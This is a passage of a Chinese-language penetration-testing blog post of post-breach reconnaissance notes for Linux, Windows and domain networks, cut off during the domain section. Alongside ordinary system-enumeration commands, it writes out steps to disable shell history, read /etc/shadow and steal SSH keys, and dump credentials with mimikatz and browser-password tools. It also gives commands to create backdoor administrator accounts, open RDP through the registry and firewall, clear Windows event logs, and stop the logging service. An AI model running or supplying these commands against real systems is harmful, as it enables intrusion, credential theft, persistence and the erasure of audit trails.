+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unset <span class="built_in">HISTORY</span> HISTFILE HISTSAVE HISTZONE <span class="built_in">HISTORY</span> HISTLOG; export</span><br><span class="line">HISTFILE=/dev/null; export HISTSIZE=<span class="number">0</span>; export HISTFILESIZE=<span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><font style="color:rgb(51,51,51);">常规需要收集的信息 </font></p>
+<p><font style="color:rgb(51,51,51);">查看历史记录 </font></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">history</span></span><br><span class="line">.bash_history</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(51,51,51);">查看</font><font style="color:rgb(51,51,51);">ssh</font><font style="color:rgb(51,51,51);">连接记录，可以的话吧</font><font style="color:rgb(51,51,51);">ssh-key</font><font style="color:rgb(51,51,51);">拿回来 </font></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/root/.ssh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/6.png"></p>
+<h4 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息 "></a><font style="color:rgb(51,51,51);">系统信息 </font></h4><p><strong><font style="color:rgb(51,51,51);">操作系统基本信息 </font></strong></p>
+<p><font style="color:rgb(51,51,51);"></font></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">uname <span class="literal">-a</span> 打印所有可用信息 </span><br><span class="line">uname –<span class="built_in">r</span> 内核版本信息 </span><br><span class="line">uname –n 系统主机名字 </span><br><span class="line">uname –m linux内核架构 </span><br><span class="line">hostname 主机名 </span><br><span class="line"><span class="built_in">cat</span> /proc/version 内核信息 </span><br><span class="line"><span class="built_in">cat</span> /etc/*<span class="literal">-release</span> 发布信息 </span><br><span class="line"><span class="built_in">cat</span> /etc/issue 发布信息 </span><br><span class="line"><span class="built_in">cat</span> /proc/cpuinfo cpu信息 </span><br><span class="line">df –a 文件信息 </span><br><span class="line">hostname 当前主机名称 </span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(51,51,51);"></font></p>
+<p><strong><font style="color:rgb(51,51,51);">获取系统环境信息 </font></strong></p>
+<p><font style="color:rgb(51,51,51);"></font></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">env 输出系统环境信息 </span><br><span class="line"><span class="built_in">set</span> 打印系统环境信息 </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span> 输出环境变量中的路径信息 </span><br><span class="line"><span class="built_in">pwd</span> 当前路径 </span><br><span class="line"><span class="built_in">cat</span> /etc/profile 显示etc/profile文件 </span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(51,51,51);"></font></p>
+<p><strong><font style="color:rgb(51,51,51);">获取系统服务信息</font></strong></p>
+<p><strong><font style="color:rgb(51,51,51);"></font></strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ps</span> <span class="literal">-aux</span> 查看进程信息 </span><br><span class="line">top 当前进程 </span><br><span class="line">netstat <span class="literal">-antpu</span> 查看当前交互端口 </span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(51,51,51);"></font></p>
+<p><font style="color:rgb(51,51,51);"></font></p>
+<p><strong><font style="color:rgb(51,51,51);">获取系统软件信息 </font></strong></p>
+<p><font style="color:rgb(51,51,51);"></font></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dpkg <span class="literal">-l</span> 已经安装的软件列表 (debian ubuntu) </span><br><span class="line">rpm <span class="literal">-qa</span> 已经安装的软件列表 (redhat centos) </span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(51,51,51);"></font></p>
+<p><strong><font style="color:rgb(51,51,51);">获取系统任务和作业 </font></strong></p>
+<p><strong><font style="color:rgb(51,51,51);">设想场景：</font></strong><font style="color:rgb(51,51,51);">存在高权限用户运行着一个低权限用户可以修改的脚本，那么通过查看计划任务发现了这个 脚本，通过修改这个脚本加上反弹shell的命令，是不是就可以反弹回一个高权限的shell。</font></p>
+<p><font style="color:rgb(51,51,51);"></font></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">crontab <span class="literal">-l</span> <span class="literal">-u</span> 用户名 不加<span class="literal">-u</span>默认列出当前用户的计划任务 –u列出指定用户的计划任务(需要root权限) </span><br><span class="line">/etc/crontab 文件中可能记录了用户自行添加的任务 </span><br><span class="line">jobs <span class="literal">-l</span> 列出放在后台的进程 </span><br><span class="line"><span class="built_in">ls</span> <span class="literal">-la</span> /etc/cron* 列出所有计划任务文件 </span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(51,51,51);"> </font></p>
+<h4 id="用户和组信息"><a href="#用户和组信息" class="headerlink" title="用户和组信息 "></a><font style="color:rgb(51,51,51);">用户和组信息 </font></h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">命令：whoami </span><br><span class="line">作用：查看当前用户 </span><br><span class="line"></span><br><span class="line">命令：id </span><br><span class="line">作用：查看当前用户信息 </span><br><span class="line"></span><br><span class="line">命令：sudo </span><br><span class="line">作用：允许普通用户执行一些或者全部的root命令的一个工具 </span><br><span class="line"></span><br><span class="line">命令：sudo <span class="literal">-l</span> </span><br><span class="line">作用：列出目前用户可执行与无法执行的指令 </span><br><span class="line"></span><br><span class="line">命令：su 用户（指定要切换身份的目标用户） </span><br><span class="line">作用：切换当前用户身份到其他用户身份 </span><br><span class="line"></span><br><span class="line">命令：<span class="built_in">cat</span> /etc/passwd </span><br><span class="line">作用：列出系统所有用户 </span><br><span class="line"></span><br><span class="line">命令：<span class="built_in">cat</span> /etc/<span class="built_in">group</span> </span><br><span class="line">作用：列出系统所有组 </span><br><span class="line"></span><br><span class="line">命令：<span class="built_in">cat</span> /etc/shadow </span><br><span class="line">作用：列出所有用户的哈希（需要root权限）</span><br><span class="line"></span><br><span class="line">命令：users </span><br><span class="line">作用：显示当前登录的用户 </span><br><span class="line"></span><br><span class="line">命令：who <span class="literal">-a</span> </span><br><span class="line">作用：显示当前登录的用户 </span><br><span class="line"></span><br><span class="line">命令：w </span><br><span class="line">作用：显示目前登入系统的用户有哪些人，以及他们正在执行的程序 </span><br><span class="line"></span><br><span class="line">命令：last </span><br><span class="line">作用：显示登入过的用户信息 </span><br><span class="line"></span><br><span class="line">命令：lastlog </span><br><span class="line">作用：显示系统中所有用户最近一次登录信息 </span><br><span class="line"></span><br><span class="line">命令：lastlog <span class="literal">-u</span> %username% </span><br><span class="line">作用：显示指定用户最后一次登入信息 </span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h4 id="其他信息"><a href="#其他信息" class="headerlink" title="其他信息 "></a><font style="color:rgb(51,51,51);">其他信息 </font></h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看开机启动项 </span></span><br><span class="line">systemctl list<span class="literal">-unit-files</span> </span><br><span class="line"><span class="comment">#我们用rc3.d这个目录为例，这个目录里面记录的是进入init 3时需要停止和启动那些服务 </span></span><br><span class="line"><span class="built_in">ls</span> /etc/rc3.d </span><br></pre></td></tr></table></figure>
+
+<p><strong><font style="color:rgb(51,51,51);"></font></strong></p>
+<p><font style="color:rgb(51,51,51);">K</font><font style="color:rgb(51,51,51);">开头代表这个启动级别需要停止的服务，编号是停止的时候执行的顺序 </font></p>
+<p><font style="color:rgb(51,51,51);">S</font><font style="color:rgb(51,51,51);">开头则是要启动那些服务 </font></p>
+<h4 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息 "></a><font style="color:rgb(51,51,51);">网络信息 </font></h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">命令：/sbin/ifconfig <span class="literal">-a</span> </span><br><span class="line">作用：列出网络接口信息 </span><br><span class="line"></span><br><span class="line">命令：<span class="built_in">cat</span> /etc/network/interfaces </span><br><span class="line">作用：列出网络接口信息 </span><br><span class="line"></span><br><span class="line">命令：arp <span class="literal">-a</span> </span><br><span class="line">作用：查看系统arp表 </span><br><span class="line"></span><br><span class="line">命令：route </span><br><span class="line">作用：打印路由信息 </span><br><span class="line"></span><br><span class="line">命令：<span class="built_in">cat</span> /etc/resolv.conf </span><br><span class="line">作用：查看dns配置信息 </span><br><span class="line"></span><br><span class="line">命令：netstat <span class="literal">-an</span> </span><br><span class="line">作用：打印本地端口开放信息 </span><br><span class="line"></span><br><span class="line">命令：iptables <span class="literal">-L</span> </span><br><span class="line">作用：列出iptables的配置规则 </span><br><span class="line"></span><br><span class="line">命令：<span class="built_in">cat</span> /etc/services </span><br><span class="line">作用：查看端口服务映射 </span><br><span class="line"></span><br><span class="line">命令：ifconfig</span><br><span class="line">作用：查看所有网络接口的属性</span><br><span class="line"></span><br><span class="line">命令：ip addr</span><br><span class="line">作用：列出所有网络接口的详细信息</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="主机信息"><a href="#主机信息" class="headerlink" title="主机信息"></a>主机信息</h4><p>whoami ⽤户信息<br>uname -a 打印所有可⽤的系统信息<br>uname -r 内核版本<br>uname -n 系统主机名。<br>uname -m 查看系统内核架构（64位&#x2F;32位）<br>hostname 系统主机名<br>lsb_release -a 发⾏版信息<br>cat &#x2F;proc&#x2F;version 内核信息</p>
+<p>cat &#x2F;etc&#x2F;passwd<br>cat &#x2F;etc&#x2F;shadow<br>cat &#x2F;etc&#x2F;group</p>
+<p>lastlog<br>last</p>
+<p><img src="/img/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/7.png"></p>
+<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="网络信息-1"><a href="#网络信息-1" class="headerlink" title="网络信息"></a>网络信息</h4><p>ip addr s<br>ifconfig<br>netstat -anptl</p>
+<h4 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h4><p>ps -ef</p>
+<h4 id="计划任务信息"><a href="#计划任务信息" class="headerlink" title="计划任务信息"></a>计划任务信息</h4><p>crontab -l<br>ls &#x2F;etc&#x2F;cron*</p>
+<h4 id="操作记录信息"><a href="#操作记录信息" class="headerlink" title="操作记录信息"></a>操作记录信息</h4><p>history<br>cat &#x2F;root&#x2F;.bash_history</p>
+<h4 id="web信息"><a href="#web信息" class="headerlink" title="web信息"></a>web信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">/apache/apache/conf/httpd.conf</span><br><span class="line">/apache/apache2/conf/httpd.conf</span><br><span class="line">/apache/php/php.ini</span><br><span class="line">/bin/php.ini</span><br><span class="line">/etc/apache/apache.conf</span><br><span class="line">/etc/apache/httpd.conf</span><br><span class="line">/etc/apache2/apache.conf</span><br><span class="line">/etc/apache2/httpd.conf</span><br><span class="line">/etc/apache2/sites-available/default</span><br><span class="line">/etc/apache2/vhosts.d/00_default_vhost.conf</span><br><span class="line">/etc/httpd/conf.d/httpd.conf</span><br><span class="line">/etc/httpd/conf.d/php.conf</span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">/etc/httpd/php.ini</span><br><span class="line">/etc/init.d/httpd</span><br><span class="line">/etc/php.ini</span><br><span class="line">/etc/php/apache/php.ini</span><br><span class="line">/etc/php/apache2/php.ini</span><br><span class="line">/etc/php/cgi/php.ini</span><br><span class="line">/etc/php/php.ini</span><br><span class="line">/etc/php/php4/php.ini</span><br><span class="line">/etc/php4.4/fcgi/php.ini</span><br><span class="line">/etc/php4/apache/php.ini</span><br><span class="line">/etc/php4/apache2/php.ini</span><br><span class="line">/etc/php4/cgi/php.ini</span><br><span class="line">/etc/php5/apache/php.ini</span><br><span class="line">/etc/php5/apache2/php.ini</span><br><span class="line">/etc/php5/cgi/php.ini</span><br><span class="line">/etc/phpmyadmin/config.inc.php</span><br><span class="line">/home/apache/conf/httpd.conf</span><br><span class="line">/home/apache2/conf/httpd.conf</span><br><span class="line">/home/bin/stable/apache/php.ini</span><br><span class="line">/home2/bin/stable/apache/php.ini</span><br><span class="line">/NetServer/bin/stable/apache/php.ini</span><br><span class="line">/opt/www/conf/httpd.conf</span><br><span class="line">/opt/xampp/etc/php.ini</span><br><span class="line">/PHP/php.ini</span><br><span class="line">/php/php.ini</span><br><span class="line">/php4/php.ini</span><br><span class="line">/php5/php.ini</span><br><span class="line">/usr/lib/php.ini</span><br><span class="line">/etc/nginx/nginx.conf</span><br><span class="line">/usr/lib/php/php.ini</span><br><span class="line">/usr/local/apache/conf/httpd.conf</span><br><span class="line">/usr/local/apache/conf/php.ini</span><br><span class="line">/usr/local/apache2/conf/httpd.conf</span><br><span class="line">/usr/local/apache2/conf/php.ini</span><br><span class="line">/usr/local/etc/php.ini</span><br><span class="line">/usr/local/httpd/conf/httpd.conf</span><br><span class="line">/usr/local/lib/php.ini</span><br><span class="line">/usr/local/php/lib/php.ini</span><br><span class="line">/usr/local/php4/lib/php.ini</span><br><span class="line">/usr/local/php4/lib/php.ini</span><br><span class="line">/usr/local/php4/php.ini</span><br><span class="line">/usr/local/php5/etc/php.ini</span><br><span class="line">/usr/local/php5/lib/php.ini</span><br><span class="line">/usr/local/php5/php5.ini</span><br><span class="line">/usr/local/share/examples/php/php.ini</span><br><span class="line">/usr/local/share/examples/php4/php.ini</span><br><span class="line">/usr/local/Zend/etc/php.ini</span><br><span class="line">/var/apache2/config.inc</span><br><span class="line">/var/httpd/conf/httpd.conf</span><br><span class="line">/var/httpd/conf/php.ini</span><br><span class="line">/var/httpd/conf/php.ini</span><br><span class="line">/var/local/www/conf/httpd.conf</span><br><span class="line">/var/local/www/conf/php.ini</span><br><span class="line">/var/www/conf/httpd.conf</span><br><span class="line">/web/conf/php.ini</span><br><span class="line">/www/conf/httpd.conf</span><br><span class="line">/www/php/php.ini</span><br><span class="line">/www/php4/php.ini</span><br><span class="line">/www/php5/php.ini</span><br><span class="line">/xampp/apache/bin/php.ini</span><br><span class="line">/xampp/apache/conf/httpd.conf</span><br></pre></td></tr></table></figure>
+
+<h4 id="数据库信息"><a href="#数据库信息" class="headerlink" title="数据库信息"></a>数据库信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/mysql</span><br><span class="line">/etc/my.cnf</span><br><span class="line">/etc/mysql/my.cnf</span><br><span class="line">/etc/mysql/my.cnf</span><br><span class="line">/var/lib/mysql/my.cnf</span><br><span class="line">/var/lib/mysql/mysql/user.MYD</span><br><span class="line">/usr/local/mysql/bin/mysql</span><br><span class="line">/usr/local/mysql/my.cnf</span><br><span class="line">/usr/share/mysql/my.cnf</span><br></pre></td></tr></table></figure>
+
+<h3 id="WIN"><a href="#WIN" class="headerlink" title="WIN"></a>WIN</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/willing-sir/p/16541890.html">https://www.cnblogs.com/willing-sir/p/16541890.html</a></p>
+<p>常用命令</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all   //获取内网ip段等</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#提权信息探测</span></span><br><span class="line">whoami /all   //查看是否有SeImpersonatePrivilege等权限以判断是否可以打土豆</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all //查询本机 IP 段，所在域等</span><br><span class="line">netstat –an //网络连接查询（<span class="literal">-a</span>显示所有连接和侦听端口,<span class="literal">-n</span>以数字形式显示地址和端口号）</span><br><span class="line">route print //路由打印</span><br><span class="line">tracert //路由追踪</span><br><span class="line">arp <span class="literal">-a</span> //ARP表查看(看局域网内有哪些ip地址)</span><br><span class="line">tasklist //查看进程信息</span><br><span class="line">tasklist /svc //显示每个进程中主持的服务</span><br><span class="line">tasklit /m //列出调用了某个dll的进程</span><br><span class="line">nslookup //查询DNS的记录，查看域名解析</span><br><span class="line">whoami //查询账号</span><br><span class="line">whoami /all //查看 sid 值、组信息、特权信息</span><br><span class="line">net user //查询本机用户列表</span><br><span class="line">net user /domain //查询域用户</span><br><span class="line">net view /domain //查询域列表</span><br><span class="line">net view //查询同一域内在线机器列表</span><br><span class="line">net localgroup administrators /domain //登录本机的域管理员</span><br><span class="line">net localgroup administrators //本机管理员[通常含有域用户]</span><br><span class="line">net session // 查看当前会话</span><br><span class="line">net share //查看 SMB 指向的路径[即共享]</span><br><span class="line">net accounts // 查看本地密码策略</span><br><span class="line">net accounts /domain // 查看域密码策略</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h4><h5 id="网络信息收集"><a href="#网络信息收集" class="headerlink" title="网络信息收集"></a>网络信息收集</h5><p>ipconfig &#x2F;all</p>
+<h5 id="主机路由信息"><a href="#主机路由信息" class="headerlink" title="主机路由信息"></a>主机路由信息</h5><p>route print</p>
+<h5 id="ARP缓存"><a href="#ARP缓存" class="headerlink" title="ARP缓存"></a>ARP缓存</h5><p>arp -a<br>看局域网内有哪些ip地址</p>
+<h5 id="DNS缓存信息"><a href="#DNS缓存信息" class="headerlink" title="DNS缓存信息"></a>DNS缓存信息</h5><p>ipconfig &#x2F;displaydns</p>
+<h5 id="Hosts文件信息"><a href="#Hosts文件信息" class="headerlink" title="Hosts文件信息"></a>Hosts文件信息</h5><p><code>type C:\Windows\System32\drivers\etc\hosts</code></p>
+<h5 id="端口连接信息"><a href="#端口连接信息" class="headerlink" title="端口连接信息"></a>端口连接信息</h5><p>netstat -ano</p>
+<h5 id="进程相关信息"><a href="#进程相关信息" class="headerlink" title="进程相关信息"></a>进程相关信息</h5><p>tasklist &#x2F;svc</p>
+<h5 id="AV防护信息"><a href="#AV防护信息" class="headerlink" title="AV防护信息"></a>AV防护信息</h5><p><code>wmic /node:localhost /namespace:\\root\SecurityCenter2 path AntiVirusProduct Get DisplayName,productState,pathToSignedProductExe | findstr /V /B /C:displayName || echo No Antivirus installed</code></p>
+<h5 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe list </span><br><span class="line">Systeminfo </span><br><span class="line">Metasploit的post/enum_patches模块 </span><br><span class="line">Windows Exploit Suggester //github项目 </span><br><span class="line">Sherlock //github项目 </span><br><span class="line">使用工具查询比较少，一般用在线网站查询。 </span><br><span class="line">http://bugs.hacking8.com/tiquan/</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="配置信息"><a href="#配置信息" class="headerlink" title="配置信息"></a>配置信息</h4><h5 id="web信息-1"><a href="#web信息-1" class="headerlink" title="web信息"></a>web信息</h5><p>netstat -ano</p>
+<h5 id="文档信息"><a href="#文档信息" class="headerlink" title="文档信息"></a>文档信息</h5><p><code>dir /a /s /b C:\*.xls</code><br><code>dir /a /s /b C:\*.doc</code><br><code>dir /s /s /b C:\*.txt</code><br>换不同盘符，不同后缀去看敏感信息</p>
+<h5 id="微信信息"><a href="#微信信息" class="headerlink" title="微信信息"></a>微信信息</h5><p><code>dir /s /b C:\&quot;WeChat Files&quot;</code></p>
+<h4 id="网络资产"><a href="#网络资产" class="headerlink" title="网络资产"></a>网络资产</h4><p>fscan kscan<br>尽量安静，不易被发现，使用正常协议，改造过的工具<br>xxx.exe -i 192.168.0.0&#x2F;24 -np -m -netbios<br>xxx.exe -i 192.168.0.0&#x2F;24 -np -m -ms17010<br>xxx.exe -i 192.168.0.0&#x2F;24 -np -p 22,2222,3389,5900,1433,3066,1521,5432,6379<br>-np -nobr -nopoc -o res.txt</p>
+<h4 id="密码凭证"><a href="#密码凭证" class="headerlink" title="密码凭证"></a>密码凭证</h4><h5 id="主机密码"><a href="#主机密码" class="headerlink" title="主机密码"></a>主机密码</h5><p>logonpasswords<br>hashdump<br>mimikatz’s sekurlsa::logonpasswords</p>
+<h5 id="浏览器密码"><a href="#浏览器密码" class="headerlink" title="浏览器密码"></a>浏览器密码</h5><p>BrowserGhost<br>HackBrowserData</p>
+<h5 id="文档密码"><a href="#文档密码" class="headerlink" title="文档密码"></a>文档密码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dir /a /s /b c:\*.xls</span><br><span class="line">dir /a /s /b c:\*.doc</span><br><span class="line">dir /a /s /b d:\*.xls</span><br><span class="line">dir /a /s /b d:\*.doc</span><br></pre></td></tr></table></figure>
+
+<h4 id="用户操作相关"><a href="#用户操作相关" class="headerlink" title="用户操作相关"></a>用户操作相关</h4><p>whoami<br>query user<br>激活guest<br>net user guest &#x2F;active:yes<br>net user guest P@ssw0rd123<br>net localgroup administrators guest &#x2F;add<br>net localgroup administrators<br>激活administrator<br>net user Administrator &#x2F;active:yes<br>net user Administrator P@ssw0rd123<br>创建后门用户<br>net user test<img src="/img/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/8.svg" alt="image"> &#x2F;add<br>net localgroup administrators</p>
+<h4 id="RDP操作相关（看谢公子的补充完）"><a href="#RDP操作相关（看谢公子的补充完）" class="headerlink" title="RDP操作相关（看谢公子的补充完）"></a>RDP操作相关（看谢公子的补充完）</h4><p>查看开放端口<br><code>reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber</code><br>开放RDP服务<br><code>reg add &quot;HKLM\SYSTEM\CurrentControlSet\control\Terminal Server&quot; /v fDenyTSConnections /d 0 /t REG_DWORD /f</code><br>开放RDP端口<br>netsh advfirewall firewall add rule name&#x3D;”Remote Desktop” protocol&#x3D;TCP dir&#x3D;<br>in localport&#x3D;3389 action&#x3D;allow</p>
+<h4 id="日志痕迹相关"><a href="#日志痕迹相关" class="headerlink" title="日志痕迹相关"></a>日志痕迹相关</h4><p>wevtutil cl “windows powershell”<br>wevtutil cl “security”<br>wevtutil cl “system”<br>wevtutil cl “Application”</p>
+<p>sc stop Schedule<br>sc stop wecsvc<br>sc stop eventlog</p>
+<h3 id="域渗透的信息收集"><a href="#域渗透的信息收集" class="headerlink" title="域渗透的信息收集"></a>域渗透的信息收集</h3><hr>
+<p><font style="color:#8A8F8D;">域渗透的信息收集：在攻防演练中，当完成边界突破后进入内网，信息搜集成为一个重要环节。充分获取信息可以有效提高攻击效率，因此需要明确主要的信息搜集思路，并搜集必要的信息，以提高这一阶段的质量，为后续攻击打下更好的基础。</font></p>
+<p><font style="color:#8A8F8D;"></font></p>
+<p><font style="color:#8A8F8D;"></font></p>
+<p><strong><font style="color:#8A8F8D;">域渗透的思路</font></strong><font style="color:#8A8F8D;">就是：</font><font style="color:#000000;">通过域成员主机，定位出域控制器IP及域管理员账号，利用域成员主机作为跳板，扩大范围，利用域管理员可以登陆域中任何成员主机特性，定位出域管理员登陆过的主机 IP,设法从域成员主机内存中dump出域管理员密码，进而拿下域控制器、渗透整个内网。也可以通过域内Web应用，Exchange系统，端口服务等获取权限进行横向</font></p>
+<p><font style="color:#8A8F8D;"></font></p>
+<p><font style="color:#8A8F8D;">DM2是为了解决安装防火墙后外部网络不能访问内部网络服务器的问题，而设立的一个位于内部网络与外部网络之间的缓冲区，在这个网络区域内可以放置一些公开的服务器资源。例如FTP服务器、E-Ma11服务器及网站服务器等允许外部用户访问这些服务器，但不可能接触到存放在内网中的信息，就算黑客入侵DM2中服务器，也不会影响到公司内部网络安全，不允许任何外部网络的直接访问，实现内外网分离，在企业的信息安全防护加了一道屏障。</font></p>
+<hr>
+<h4 id="1-基本信息"><a href="#1-基本信息" class="headerlink" title="1.基本信息"></a>1.基本信息</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IP、出网判断、本机网络连接以及开放端口</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-域内定位"><a href="#2-域内定位" class="headerlink" title="2.域内定位"></a>2.域内定位</h4><p>定位是否处于<font style="color:#DF2A3F;">内网</font>、<font style="color:#DF2A3F;">DC域控</font></p>
+<ol>
+<li>时间服务<ol>
+<li>net time &#x2F;domain</li>
+</ol>
+</li>
+<li>获取Domain Controllers 组的成员<ol>
